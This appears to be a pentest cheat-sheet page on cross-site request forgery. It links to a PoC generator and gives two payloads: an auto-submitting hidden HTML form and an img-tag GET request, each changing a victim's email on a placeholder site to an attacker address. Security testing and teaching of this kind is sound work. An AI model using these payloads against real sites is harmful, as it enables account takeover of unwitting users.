---
title: "CSRF"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
  noindex: false # false (default) or true
---


- Free Poc Tool : 
https://security.love/CSRF-PoC-Genorator/

## Basic CSRF 

```sh
<html> 
<body> 
<form action="https://vulnerable-website.com/email/change" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> 
<script> document.forms[0].submit(); </script> 
</body> 
</html>
```

- Even possible to do so : 

```sh
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```